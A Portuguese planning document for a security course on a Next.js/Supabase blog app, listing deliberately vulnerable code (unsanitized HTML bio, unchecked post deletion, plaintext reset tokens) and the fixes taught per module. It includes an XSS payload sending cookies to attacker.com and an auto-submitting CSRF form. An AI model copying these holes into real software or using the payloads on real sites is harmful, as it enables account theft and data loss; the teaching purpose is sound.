# 🎯 Preparação do Curso de Segurança

## 📊 Análise do Codebase Atual

### ✅ O QUE JÁ EXISTE E PODE SER USADO

#### **Autenticação (Já Funcional)**
- ✅ `src/actions/auth.js` - signUp, signIn, signOut
- ✅ `src/hooks/useAuth.js` - Hook de autenticação
- ✅ `src/hooks/useProtectedRoute.js` - Proteção de rotas
- ✅ `src/utils/supabase/middleware.js` - Refresh token automático
- ✅ `src/components/Login/index.jsx` - Formulário de login
- ✅ `src/components/Register/index.jsx` - Formulário de registro
- ✅ Supabase Auth configurado e funcionando

#### **Features Existentes**
- ✅ Posts (listar, visualizar individual, likes)
- ✅ Comentários (criar, respostas aninhadas)
- ✅ Busca de posts
- ✅ Sistema de usuários
- ✅ Logs com Winston (`src/logger.js`, `src/eventLogger.js`)

#### **API Routes Existentes**
- ✅ `src/app/api/posts/[slug]/route.js` - Buscar post
- ✅ `src/app/api/comment/[id]/replies/route.js` - Buscar respostas

#### **Banco de Dados (Supabase)**
```sql
User: id, name, username, avatar
Post: id, title, slug, body, markdown, authorId, likes, createdAt, updatedAt
Comment: id, text, authorId, postId, parentId, createdAt, updatedAt
```

---

## 🚧 O QUE IMPLEMENTAR ANTES DO CURSO (Versão INSEGURA)

### **1. Campo de Bio/Perfil Editável** 
**Para demonstrar**: XSS (Módulo 1)

#### Implementar ANTES (inseguro):
```javascript
// src/app/profile/edit/page.js (CRIAR)
"use client"
import { useState } from 'react'
import { updateUserBio } from '@/actions/profile'

export default function EditProfile() {
  const [bio, setBio] = useState('')
  
  return (
    <form action={updateUserBio}>
      <textarea 
        name="bio" 
        value={bio}
        onChange={(e) => setBio(e.target.value)}
        placeholder="Escreva sua bio..."
      />
      <button type="submit">Salvar</button>
    </form>
  )
}
```

```javascript
// src/actions/profile.js (CRIAR - VERSÃO INSEGURA)
export async function updateUserBio(formData) {
  const supabase = await createClient()
  const { data: { user } } = await supabase.auth.getUser()
  
  // ⚠️ VULNERÁVEL: Aceita qualquer HTML sem sanitização
  const bio = formData.get('bio')
  
  await database.updateUserBio(user.id, bio)
}
```

```javascript
// src/lib/database.js - ADICIONAR método
async updateUserBio(userId, bio) {
  const { data, error } = await db
    .from('User')
    .update({ bio })  // ⚠️ Salva direto sem validação
    .eq('id', userId)
  
  if (error) throw error
  return data
}
```

```javascript
// src/components/UserBio/index.jsx (CRIAR - VULNERÁVEL)
export function UserBio({ bio }) {
  // ⚠️ VULNERÁVEL: Renderiza HTML direto
  return (
    <div dangerouslySetInnerHTML={{ __html: bio }} />
  )
}
```

**Durante o curso**: Mostrar XSS, depois adicionar DOMPurify

---

### **2. Delete Post/Comentário**
**Para demonstrar**: CSRF (Módulo 1), RBAC (Módulo 3)

#### Implementar ANTES (inseguro):
```javascript
// src/actions/posts.js (CRIAR - VERSÃO INSEGURA)
export async function deletePost(postId) {
  const supabase = await createClient()
  const { data: { user } } = await supabase.auth.getUser()
  
  // ⚠️ VULNERÁVEL: Sem verificação CSRF
  // ⚠️ VULNERÁVEL: Sem verificação de ownership/role
  
  const { error } = await db
    .from('Post')
    .delete()
    .eq('id', postId)
  
  if (error) throw error
  
  revalidatePath('/')
  return { success: true }
}
```

```javascript
// src/components/DeletePostButton/index.jsx (CRIAR)
'use client'
import { deletePost } from '@/actions/posts'

export function DeletePostButton({ postId }) {
  const handleDelete = async () => {
    await deletePost(postId)
    window.location.href = '/'
  }
  
  return <button onClick={handleDelete}>Deletar Post</button>
}
```

**Durante o curso**: 
- Módulo 1: Adicionar proteção CSRF
- Módulo 3: Adicionar verificação de role (só owner ou admin)

---

### **3. Edit Comment (dentro de 15 min)**
**Para demonstrar**: ABAC (Módulo 3)

#### Implementar ANTES (simples):
```javascript
// src/actions/comments.js (CRIAR)
export async function editComment(commentId, newText) {
  const supabase = await createClient()
  const { data: { user } } = await supabase.auth.getUser()
  
  // ⚠️ VULNERÁVEL: Sem verificação de tempo
  // ⚠️ VULNERÁVEL: Sem verificação de ownership
  
  const { error } = await db
    .from('Comment')
    .update({ text: newText })
    .eq('id', commentId)
  
  if (error) throw error
  return { success: true }
}
```

```javascript
// src/components/EditCommentButton/index.jsx (CRIAR)
'use client'
import { editComment } from '@/actions/comments'

export function EditCommentButton({ comment }) {
  const [editing, setEditing] = useState(false)
  const [text, setText] = useState(comment.text)
  
  if (!editing) {
    return <button onClick={() => setEditing(true)}>Editar</button>
  }
  
  return (
    <>
      <textarea value={text} onChange={(e) => setText(e.target.value)} />
      <button onClick={() => editComment(comment.id, text)}>Salvar</button>
    </>
  )
}
```

**Durante o curso**: Adicionar regra de 15 minutos (ABAC)

---

### **4. Forgot Password**
**Para demonstrar**: Token Security (Módulo 2)

#### Já existe página `/forgot-password`, implementar lógica ANTES:
```javascript
// src/actions/passwordReset.js (CRIAR - VERSÃO INSEGURA)
export async function requestPasswordReset(email) {
  // ⚠️ VULNERÁVEL: Token exposto na URL
  // ⚠️ VULNERÁVEL: Sem expiração
  // ⚠️ VULNERÁVEL: Token não tem hash
  
  const token = randomBytes(32).toString('hex')
  
  await db.from('PasswordResetToken').insert({
    email,
    token,  // ⚠️ Plain text!
    createdAt: new Date()
  })
  
  // Enviar email com link:
  // https://app.com/reset-password?token=abc123
  
  return { success: true }
}
```

**Durante o curso**: 
- Mostrar problema: token na URL, sem hash, sem expiração
- Corrigir: hash no banco, expiração 15 min, one-time use

---

### **5. Migration: Adicionar Role ao User**
**Para demonstrar**: RBAC (Módulo 3)

#### Implementar ANTES:
```sql
-- supabase/migrations/001_add_role_to_user.sql (CRIAR)
ALTER TABLE "User" ADD COLUMN role TEXT DEFAULT 'user';
ALTER TABLE "User" ADD COLUMN bio TEXT;

-- Criar alguns usuários admin manualmente para demo
UPDATE "User" SET role = 'admin' WHERE username = 'seu_usuario';
```

**Durante o curso**: Usar esse campo para implementar verificações RBAC

---

### **6. Next.js Config Básico (SEM segurança)**
**Para demonstrar**: Headers de Segurança (Módulo 1 e 4)

#### Implementar ANTES:
```javascript
// next.config.js - versão INICIAL (sem segurança)
const nextConfig = {
  // ⚠️ SEM headers de segurança
  // ⚠️ SEM CSP
  // ⚠️ SEM CORS configurado
}
```

**Durante o curso**: Adicionar todos os headers progressivamente

---

## 🎯 MAPEAMENTO: Ementa → Código Existente

### **MÓDULO 1: XSS, CSRF, Vazamento de Tokens**

#### **🎥 XSS (2 vídeos - 25 min total)**

**Vídeo 1: Demonstrando XSS**
- **Usar**: Campo de bio (implementado antes)
- **Mostrar**: 
  1. Usuário salva `<script>alert('XSS')</script>` na bio
  2. Renderiza com `dangerouslySetInnerHTML`
  3. Script executa
  4. Roubo de cookies: `<img src=x onerror="fetch('attacker.com?cookie='+document.cookie)">`

**Vídeo 2: Corrigindo XSS**
- **Código a adicionar** (durante gravação):
```javascript
// src/lib/sanitize.js (CRIAR)
import DOMPurify from 'isomorphic-dompurify'

export function sanitizeHTML(dirty) {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href']
  })
}
```

```javascript
// src/components/UserBio/index.jsx (MODIFICAR)
import { sanitizeHTML } from '@/lib/sanitize'

export function UserBio({ bio }) {
  const cleanBio = sanitizeHTML(bio)  // ✅ Sanitizar
  return <div dangerouslySetInnerHTML={{ __html: cleanBio }} />
}
```

---

#### **🎥 CSRF (2 vídeos - 25 min total)**

**Vídeo 1: Demonstrando CSRF**
- **Usar**: Botão de deletar post (implementado antes)
- **Mostrar**:
  1. Criar site malicioso `malicious-site.html`:
```html
<form action="https://codeconnect.com/api/posts/123" method="POST">
  <input type="hidden" name="action" value="delete">
</form>
<script>document.forms[0].submit()</script>
```
  2. Vítima acessa site malicioso logada
  3. Post deletado sem consentimento

**Vídeo 2: Corrigindo CSRF**
- **Mostrar**: Next.js Server Actions já têm proteção built-in (origin check)
- **Código a adicionar**:
```javascript
// src/lib/csrf.js (CRIAR - explicar conceito)
import { headers } from 'next/headers'

export function validateCSRF() {
  const headersList = headers()
  const origin = headersList.get('origin')
  const host = headersList.get('host')
  
  // Next.js já faz isso automaticamente para Server Actions
  if (origin && !origin.includes(host)) {
    throw new Error('CSRF detected')
  }
}
```

---

#### **🎥 Vazamento de Tokens (1 vídeo - 12 min)**

**Usar**: `src/eventLogger.js` e `src/actions/auth.js` (já existem)

**Mostrar problemas**:
1. Abrir `src/actions/auth.js` - mostrar que pode logar dados sensíveis
2. Logs do Vercel com tokens expostos (simulação)
3. localStorage vs httpOnly cookies

**Código a adicionar**:
```javascript
// src/lib/logSanitizer.js (CRIAR)
const SENSITIVE_KEYS = ['password', 'token', 'accessToken', 'refreshToken']

export function sanitizeForLog(data) {
  if (typeof data !== 'object') return data
  
  const sanitized = { ...data }
  for (const key in sanitized) {
    if (SENSITIVE_KEYS.some(k => key.toLowerCase().includes(k))) {
      sanitized[key] = '[REDACTED]'
    }
  }
  return sanitized
}
```

```javascript
// src/eventLogger.js (MODIFICAR)
import { sanitizeForLog } from './lib/logSanitizer'

export function logEvent({ step, operation, userId, metadata = {} }) {
  const sanitized = sanitizeForLog(metadata)  // ✅ Sanitizar
  
  if (logger) {
    logger.info(`[EVENT] ${step} -> ${operation}`, { userId, ...sanitized })
  }
}
```

---

### **MÓDULO 2: OAuth e Tokens**

#### **🎥 OAuth Flow (1 vídeo - 12 min)**

**Usar**: Supabase Auth (já configurado)

**Mostrar (sem código, apenas explicação)**:
1. Abrir `src/utils/supabase/middleware.js` - mostrar refresh automático
2. Explicar Authorization Code Flow
3. PKCE (Supabase já usa)
4. State parameter (proteção CSRF em OAuth)

**Código existente a analisar**:
```javascript
// src/utils/supabase/middleware.js (JÁ EXISTE)
export async function updateSession(request) {
  // ✅ Supabase já faz refresh token rotation
  const { data: { user }, error } = await supabase.auth.getUser()
  
  if (error?.code === 'refresh_token_not_found') {
    // ✅ Já trata token expirado
  }
}
```

---

#### **🎥 Refresh Token Security (1 vídeo - 15 min)**

**Usar**: `src/utils/supabase/middleware.js` (já existe)

**Mostrar**:
1. Como Supabase faz token rotation (ler docs)
2. Adicionar logs para ver refresh acontecendo
3. httpOnly cookies (Supabase já usa)

**Código a adicionar** (apenas logs):
```javascript
// src/eventLogger.js (ADICIONAR evento)
export function logSecurityEvent(event) {
  logEvent({
    step: 'SECURITY',
    operation: event.type,
    userId: event.userId,
    metadata: { severity: event.severity }
  })
}
```

```javascript
// src/utils/supabase/middleware.js (MODIFICAR - adicionar log)
if (error?.code === 'refresh_token_not_found') {
  logSecurityEvent({
    type: 'REFRESH_TOKEN_EXPIRED',
    userId: user?.id,
    severity: 'WARNING'
  })
}
```

---

#### **🎥 Reset Password Seguro (1 vídeo - 14 min)**

**Usar**: Forgot password (implementado antes, versão insegura)

**Mostrar problemas**:
1. Token na URL (pode vazar em logs, Referer header)
2. Token sem hash no banco
3. Sem expiração
4. Pode reusar token

**Código a modificar**:
```javascript
// src/actions/passwordReset.js (MODIFICAR)
import { createHash } from 'crypto'

export async function requestPasswordReset(email) {
  const token = randomBytes(32).toString('hex')
  const hashedToken = createHash('sha256').update(token).digest('hex')  // ✅ Hash
  
  await db.from('PasswordResetToken').insert({
    email,
    token: hashedToken,  // ✅ Salvar hash
    expiresAt: new Date(Date.now() + 15 * 60 * 1000),  // ✅ 15 min
    used: false  // ✅ One-time use
  })
  
  // Enviar email (token plain só no email)
  return { success: true }
}
```

---

### **MÓDULO 3: RBAC e ABAC**

#### **🎥 RBAC (3 vídeos - 37 min total)**

**Vídeo 1: O que é RBAC** (10 min - sem código)

**Vídeo 2: Implementando RBAC** (15 min)
- **Usar**: Campo `role` no User (já foi adicionado na migration)
- **Usar**: `deletePost` (já implementado antes)

**Código a adicionar**:
```javascript
// src/actions/posts.js (MODIFICAR)
export async function deletePost(postId) {
  const supabase = await createClient()
  const { data: { user } } = await supabase.auth.getUser()
  
  // ✅ Buscar post e role do usuário
  const post = await database.getPostById(postId)
  const dbUser = await database.getUserByUsername(user.email.split('@')[0])
  
  // ✅ RBAC: Verificar se é owner ou admin
  if (post.authorId !== dbUser.id && dbUser.role !== 'admin') {
    throw new Error('Sem permissão para deletar')
  }
  
  await db.from('Post').delete().eq('id', postId)
  return { success: true }
}
```

**Vídeo 3: Middleware RBAC** (12 min)
```javascript
// src/lib/permissions.js (CRIAR)
export async function requireRole(user, allowedRoles) {
  const dbUser = await database.getUserByUsername(user.email.split('@')[0])
  
  if (!allowedRoles.includes(dbUser.role)) {
    throw new Error('Acesso negado')
  }
  
  return dbUser
}
```

---

#### **🎥 ABAC (2 vídeos - 25 min total)**

**Vídeo 1: O que é ABAC** (10 min - sem código)

**Vídeo 2: Implementando ABAC** (15 min)
- **Usar**: `editComment` (já implementado antes)

**Código a adicionar**:
```javascript
// src/actions/comments.js (MODIFICAR)
export async function editComment(commentId, newText) {
  const supabase = await createClient()
  const { data: { user } } = await supabase.auth.getUser()
  
  const comment = await database.getCommentById(commentId)
  const dbUser = await database.getUserByUsername(user.email.split('@')[0])
  
  // ✅ ABAC: Verificar ownership
  if (comment.authorId !== dbUser.id) {
    throw new Error('Você não é o autor deste comentário')
  }
  
  // ✅ ABAC: Verificar tempo (15 minutos)
  const fifteenMinutes = 15 * 60 * 1000
  const timePassed = Date.now() - new Date(comment.createdAt).getTime()
  
  if (timePassed > fifteenMinutes) {
    throw new Error('Tempo limite de edição expirado (15 min)')
  }
  
  await db.from('Comment').update({ text: newText }).eq('id', commentId)
  return { success: true }
}
```

---

### **MÓDULO 4: CORS e Headers**

#### **🎥 CORS e CSP (2 vídeos - 27 min total)**

**Usar**: `next.config.js` (já existe, mas sem configuração)

**Código a adicionar**:
```javascript
// next.config.js (MODIFICAR)
const nextConfig = {
  async headers() {
    return [{
      source: '/:path*',
      headers: [
        // ✅ Headers de segurança
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'X-Frame-Options', value: 'DENY' },
        { key: 'X-XSS-Protection', value: '1; mode=block' },
        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
        // ✅ CSP básico
        { 
          key: 'Content-Security-Policy', 
          value: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
        },
        
        // ✅ CORS
        { key: 'Access-Control-Allow-Origin', value: process.env.ALLOWED_ORIGINS || '*' },
        { key: 'Access-Control-Allow-Methods', value: 'GET,POST,PUT,DELETE' },
      ]
    }]
  }
}
```

---

### **MÓDULO 5: Deploy**

**Usar**: Projeto completo já funcional

**Passos durante gravação**:
1. Criar `vercel.json`
2. Configurar env vars na Vercel
3. Testar security headers com securityheaders.com
4. Mostrar logs no Vercel
5. npm audit
6. Dependabot (GitHub)

---

## 📝 CHECKLIST DE PREPARAÇÃO ⭐ SIMPLIFICADO

### **Antes de Gravar** (você implementa):

- [ ] **Migration**: Adicionar `role TEXT`, `bio TEXT` e `reportCount INTEGER` 
- [ ] **Criar** `src/app/profile/edit/page.js` (bio vulnerável)
- [ ] **Criar** `src/actions/profile.js` (updateUserBio - sem sanitização)
- [ ] **Criar** `src/components/UserBio/index.jsx` (dangerouslySetInnerHTML)
- [ ] **Criar** `src/actions/posts.js` (deletePost - sem CSRF/RBAC)
- [ ] **Criar** `src/components/DeletePostButton/index.jsx`
- [ ] **Criar** `src/actions/passwordReset.js` (versão insegura)
- [ ] **Instalar** `isomorphic-dompurify` (mas não usar ainda)
- [ ] **Seed**: Criar 1-2 usuários com role `admin` e 1 `moderator`

**❌ NÃO precisa mais:**
- ~~Edit comment com 15 minutos~~ (removido)
- ~~Painel de moderação~~ (removido)
- ~~Policy Engine complexo~~ (removido)

### **Durante o Curso** (você ensina e aplica segurança):

- [ ] **Módulo 1**: Sanitizar bio (XSS)
- [ ] **Módulo 1**: Validar CSRF em deletePost
- [ ] **Módulo 1**: Sanitizar logs
- [ ] **Módulo 2**: Analisar refresh token do Supabase
- [ ] **Módulo 2**: Corrigir reset password
- [ ] **Módulo 3**: Adicionar RBAC em deletePost
- [ ] **Módulo 3**: Adicionar ABAC em editComment
- [ ] **Módulo 4**: Configurar headers no next.config.js
- [ ] **Módulo 5**: Deploy na Vercel

---

## 🎯 VANTAGENS DESSA ABORDAGEM

1. ✅ **Menos código durante gravação** - features já prontas
2. ✅ **Foco 100% em segurança** - não em desenvolver features
3. ✅ **Mais realista** - auditoria de código existente
4. ✅ **Hands-on prático** - ver problema → aplicar solução
5. ✅ **Menos riscos técnicos** - não debugar features durante gravação
6. ✅ **Aluno aprende a identificar vulnerabilidades** - skill mais valiosa

---

## 📊 ESFORÇO DE PREPARAÇÃO ⭐ ATUALIZADO

### **Tempo Estimado**: ~3-4 horas (era 4-6h)

- Migration (role + bio + reportCount): 15 min
- Bio editável (3 arquivos): 30 min
- Delete post (2 arquivos): 20 min
- ~~Edit comment~~ ❌ **REMOVIDO** (economiza 20 min)
- Reset password (2 arquivos): 30 min
- Seeds de usuários admin/moderator: 10 min
- Testar tudo funciona: 1 hora (menos features = menos testes)
- Documentar estado inicial: 30 min

### **Complexidade**: Baixa (features simples)

### **Redução com Simplificação:**
- **-2 vídeos** no Módulo 3 (6 → 4)
- **-20 arquivos** novos (~60 → ~40)
- **-1 hora** de preparação
- **+Foco** em conceitos, não em features

**Você implementa uma vez**, depois foca 100% em ensinar segurança! 🎯

